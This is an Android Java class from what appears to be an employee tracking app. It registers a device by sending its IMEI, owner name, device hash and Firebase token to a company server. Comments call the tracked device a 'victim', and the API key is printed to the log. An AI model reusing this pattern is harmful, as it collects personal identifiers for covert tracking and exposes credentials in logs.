package com.theah64.ets.utils;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.support.annotation.NonNull;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.firebase.iid.FirebaseInstanceId;
import com.theah64.ets.model.Employee;

import org.json.JSONException;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

/**
 * All the auth needed API request must be passed through this gate way.
 * Created by theapache64 on 12/9/16.
 */
public class APIRequestGateway {

    private static final String KEY_API_KEY = "api_key";

    private static final String X = APIRequestGateway.class.getSimpleName();
    private final Activity activity;
    private TelephonyManager tm;

    private static String getDeviceName() {
        final String manufacturer = Build.MANUFACTURER;
        final String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return model.toUpperCase();
        } else {
            return manufacturer.toUpperCase() + " " + model;
        }
    }


    public static class DeviceInfoBuilder {

        private static final String HOT_REGEX = "[,=]";
        public StringBuilder stringBuilder = new StringBuilder();

        public DeviceInfoBuilder put(final String key, final String value) {
            stringBuilder.append(getCooledValue(key)).append("=").append(getCooledValue(value)).append(",");
            return this;
        }

        public DeviceInfoBuilder put(final String key, final int value) {
            return put(key, String.valueOf(value));
        }

        public DeviceInfoBuilder put(final String key, final long value) {
            return put(key, String.valueOf(value));
        }

        public DeviceInfoBuilder put(final String key, final boolean value) {
            return put(key, String.valueOf(value));
        }

        private static String getCooledValue(String value) {
            if (value == null || value.isEmpty()) {
                return "-";
            }
            return value.replaceAll(HOT_REGEX, "~");
        }

        public DeviceInfoBuilder putLastInfo(final String key, final String value) {
            stringBuilder.append(getCooledValue(key)).append("=").append(getCooledValue(value));
            return this;
        }

        @Override
        public String toString() {
            return stringBuilder.toString();
        }


    }


    public interface APIRequestGatewayCallback {
        void onReadyToRequest(final String apiKey);

        void onFailed(final String reason);
    }

    private final Context context;
    @NonNull
    private final APIRequestGatewayCallback callback;

    private APIRequestGateway(Context context, final Activity activity, @NonNull APIRequestGatewayCallback callback) {
        this.context = context;
        this.activity = activity;
        this.callback = callback;
        execute();
    }

    public APIRequestGateway(final Activity activity, APIRequestGatewayCallback callback) {
        this(activity.getBaseContext(), activity, callback);
    }

    public APIRequestGateway(Context context, APIRequestGatewayCallback callback) {
        this(context, null, callback);
    }


    private void register(final Context context) {

        final ProfileUtils profileUtils = ProfileUtils.getInstance(context);

        tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        //Collecting needed information
        final String name = profileUtils.getDeviceOwnerName();

        final String imei = tm.getDeviceId();
        final String deviceName = getDeviceName();
        final String deviceHash = DarKnight.getEncrypted(deviceName + imei);

        final PrefUtils prefUtils = PrefUtils.getInstance(context);

        String fcmId = FirebaseInstanceId.getInstance().getToken();

        if (fcmId == null) {
            Log.d(X, "Live token is null, collecting from pref");
            fcmId = prefUtils.getString(Employee.KEY_FCM_ID);
        }

        //Attaching them with the request
        final Request inRequest = new APIRequestBuilder("/in")
                .addParam("company_code", App.getCompanyCode())
                .addParamIfNotNull("name", name)
                .addParam("device_hash", deviceHash)
                .addParam("imei", imei)
                .addParamIfNotNull(Employee.KEY_FCM_ID, fcmId)
                .build();

        //Doing API request
        OkHttpUtils.getInstance().getClient().newCall(inRequest).enqueue(new Callback() {

            @Override
            public void onFailure(Call call, final IOException e) {
                e.printStackTrace();
                if (activity != null) {
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            callback.onFailed(e.getMessage());
                        }
                    });
                } else {
                    callback.onFailed(e.getMessage());
                }
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {

                try {

                    final APIResponse inResp = new APIResponse(OkHttpUtils.logAndGetStringBody(response));
                    final String apiKey = inResp.getJSONObjectData().getString(KEY_API_KEY);

                    //Saving in preference
                    final SharedPreferences.Editor editor = prefUtils.getEditor();
                    editor.putString(KEY_API_KEY, apiKey).commit();

                    if (activity != null) {

                        activity.runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                callback.onReadyToRequest(apiKey);
                            }
                        });

                    } else {
                        callback.onReadyToRequest(apiKey);
                    }
                } catch (JSONException | APIResponse.APIException e) {
                    e.printStackTrace();
                    if (activity != null) {
                        activity.runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                callback.onFailed(e.getMessage());
                            }
                        });
                    } else {
                        callback.onFailed(e.getMessage());
                    }
                }
            }
        });

    }

    private void execute() {

        Log.d(X, "Opening gateway...");

        if (NetworkUtils.hasNetwork(context)) {

            Log.i(X, "Has network");

            final PrefUtils prefUtils = PrefUtils.getInstance(context);
            final String apiKey = prefUtils.getString(KEY_API_KEY);

            if (apiKey != null) {

                Log.d(X, "hasApiKey " + apiKey);

                if (activity != null) {
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            callback.onReadyToRequest(apiKey);
                        }
                    });
                } else {
                    callback.onReadyToRequest(apiKey);
                }

            } else {

                Log.i(X, "Registering victim...");

                //Register victim here
                register(context);
            }

        } else {

            if (activity != null) {
                activity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        callback.onFailed("No network!");
                    }
                });
            } else {
                callback.onFailed("No network!");
            }

            Log.e(X, "Doesn't have APIKEY and no network!");

        }
    }
}
